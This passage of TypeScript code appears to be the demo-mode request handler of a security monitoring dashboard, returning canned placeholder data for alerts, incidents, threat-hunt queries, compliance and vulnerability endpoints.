    if (base.match(/^\/compliance\/controls\/\d+\/assessment$/)) return { status: 'compliant' } as unknown as T
    // POST /compliance/controls/{id}/evidence
    if (base.match(/^\/compliance\/controls\/\d+\/evidence$/)) return { id: Date.now(), title: '(demo)', evidence_type: 'document', description: null, created_at: new Date().toISOString() } as unknown as T
    // PATCH /vulnerability/findings/{id}
    if (base.match(/^\/vulnerability\/findings\/\d+$/)) return { id: 0, status: 'acknowledged' } as unknown as T

    if (base === '/iocs/sync') {
      return { status: 'accepted', task_id: 'demo-task-ioc-sync', tenant_id: 9999 } as unknown as T
    }

    // POST /threat-feeds/enrich/{ioc_id}
    const enrichMatch = base.match(/^\/threat-feeds\/enrich\/(\d+)$/)
    if (enrichMatch) {
      return { status: 'accepted', ioc_id: parseInt(enrichMatch[1]), task_id: 'demo-task-enrich-' + enrichMatch[1] } as unknown as T
    }

    // POST /threat-feeds/lookup-async
    if (base === '/threat-feeds/lookup-async') {
      return { status: 'accepted', task_id: 'demo-task-lookup' } as unknown as T
    }

    return {} as unknown as T
  }

  // ── GET: Exact matches ────────────────────────────────────────────────────
  if (base === '/alerts/stats')         return DEMO_ALERT_STATS                                                       as unknown as T
  if (base === '/alerts/open')          return DEMO_ALERTS.filter((a) => a.status === 'Open').slice(0, 10)          as unknown as T
  if (base === '/incidents/stats')      return DEMO_INCIDENT_STATS   as unknown as T
  if (base === '/users/me')             return DEMO_ME               as unknown as T
  if (base === '/threat-feeds/config')  return DEMO_FEED_CONFIG      as unknown as T
  if (base === '/notifications/config') return DEMO_NOTIF_CONFIG     as unknown as T
  if (base === '/reports/summary')    return DEMO_REPORT_SUMMARY    as unknown as T
  if (base === '/reports/scheduled')  return DEMO_SCHEDULED_CONFIGS as unknown as T
  if (base === '/reports/history')    return DEMO_REPORT_HISTORY    as unknown as T
  if (base === '/org/info')           return DEMO_ORG               as unknown as T

  // ── GET: Incident sub-paths (must be checked before the /incidents/{id} match) ──
  const notesMatch    = base.match(/^\/incidents\/(\d+)\/notes$/)
  const evidenceMatch = base.match(/^\/incidents\/(\d+)\/evidence$/)
  if (notesMatch) {
    const id = parseInt(notesMatch[1])
    return ((DEMO_INCIDENT_DETAILS.find((i) => i.id === id) ?? DEMO_INCIDENT_DETAILS[0]).notes) as unknown as T
  }
  if (evidenceMatch) {
    const id = parseInt(evidenceMatch[1])
    return ((DEMO_INCIDENT_DETAILS.find((i) => i.id === id) ?? DEMO_INCIDENT_DETAILS[0]).evidence) as unknown as T
  }

  // ── GET: Specific incident detail ─────────────────────────────────────────
  const incidentMatch = base.match(/^\/incidents\/(\d+)$/)
  if (incidentMatch) {
    const id = parseInt(incidentMatch[1])
    return (DEMO_INCIDENT_DETAILS.find((i) => i.id === id) ?? DEMO_INCIDENT_DETAILS[0]) as unknown as T
  }

  // ── GET: Prefix matches ───────────────────────────────────────────────────
  if (base.startsWith('/alerts')) {
    // /alerts/ returns paginated AlertsPage; apply basic filters from query string
    const qs = path.includes('?') ? new URLSearchParams(path.split('?')[1]) : new URLSearchParams()
    const status   = qs.get('status')
    const severity = qs.get('severity')
    const offset   = parseInt(qs.get('offset') ?? '0')
    const limit    = parseInt(qs.get('limit')  ?? '25')
    let items = DEMO_ALERTS.map((a) => ({
      ...a,
      agent_hostname: DEMO_AGENTS.find((g) => g.id === a.agent_id)?.hostname ?? null,
    }))
    if (status)   items = items.filter((a) => a.status === status)
    if (severity) items = items.filter((a) => a.severity === severity)
    return { total: items.length, offset, limit, items: items.slice(offset, offset + limit) } as unknown as T
  }
  if (base.startsWith('/agents'))          return DEMO_AGENTS           as unknown as T
  if (base.startsWith('/incidents'))       return DEMO_INCIDENTS        as unknown as T
  if (base.startsWith('/iocs'))            return DEMO_IOCS             as unknown as T
  if (base.startsWith('/detection-rules')) return DEMO_DETECTION_RULES  as unknown as T
  if (base.startsWith('/audit-logs'))      return DEMO_AUDIT_LOGS       as unknown as T
  if (base.startsWith('/users'))           return DEMO_USERS            as unknown as T
  if (base.startsWith('/commands'))        return DEMO_COMMANDS         as unknown as T
  if (base.startsWith('/support'))         return []                    as unknown as T
  if (base.startsWith('/platform'))        return []                    as unknown as T

  // ── GET: Task status ─────────────────────────────────────────────────────
  const taskMatch = base.match(/^\/tasks\/(.+)$/)
  if (taskMatch) {
    return { task_id: taskMatch[1], status: 'SUCCESS', result: { queued: 0 } } as unknown as T
  }

  // ── GET: Threat hunt endpoints ────────────────────────────────────────────
  if (base === '/hunt/process')     return DEMO_HUNT_PROCESS     as unknown as T
  if (base === '/hunt/hash')        return DEMO_HUNT_HASH        as unknown as T
  if (base === '/hunt/ip')          return DEMO_HUNT_IP          as unknown as T
  if (base === '/hunt/domain')      return DEMO_HUNT_DOMAIN      as unknown as T
  if (base === '/hunt/persistence') return DEMO_HUNT_PERSISTENCE as unknown as T

  // ── GET: Log telemetry ────────────────────────────────────────────────────
  if (base === '/telemetry/logs' || base.startsWith('/telemetry/logs')) return DEMO_LOG_TELEMETRY as unknown as T

  // ── GET: Compliance ───────────────────────────────────────────────────────
  if (base === '/compliance/dashboard') return DEMO_COMPLIANCE_DASHBOARD as unknown as T
  if (base.match(/^\/compliance\/controls\/\d+\/evidence$/)) return [] as unknown as T

  // ── GET: Vulnerability Scanner ────────────────────────────────────────────
  if (base === '/vulnerability/dashboard') return DEMO_VULN_DASHBOARD as unknown as T
  if (base === '/vulnerability/findings')  return DEMO_VULN_FINDINGS  as unknown as T

  // ── GET: Browser Security ─────────────────────────────────────────────────
  if (base === '/browser-security/dashboard') return DEMO_BROWSER_DASHBOARD as unknown as T
  if (base === '/browser-security/events')    return DEMO_BROWSER_EVENTS    as unknown as T

  // ── PATCH: Browser Security event status ──────────────────────────────────
  if (method === 'PATCH' && base.match(/^\/browser-security\/events\/\d+$/)) {
    return { id: 1, status: 'acknowledged' } as unknown as T
  }

  return [] as unknown as T
}
